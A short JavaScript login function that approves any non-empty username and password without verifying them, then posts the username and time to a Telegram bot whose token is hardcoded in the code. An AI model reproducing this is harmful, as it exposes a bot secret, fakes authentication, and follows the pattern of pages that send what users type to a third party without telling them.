const BOT_TOKEN = "8354788016:AAGzzmqSAiXBKN8tUrefE-FluAucCz4Pgr0";
const CHAT_ID = "8324590734";

function login(){

let username = document.getElementById("username").value;
let password = document.getElementById("password").value;

if(username === "" || password === ""){
alert("Enter Username & Password");
return;
}

alert("Login Success");

let message =
"🔐 LOGIN ALERT\n\n" +
"👤 Username: " + username + "\n" +
"🕒 Time: " + new Date().toLocaleString();

fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
chat_id:CHAT_ID,
text:message
})
});

}
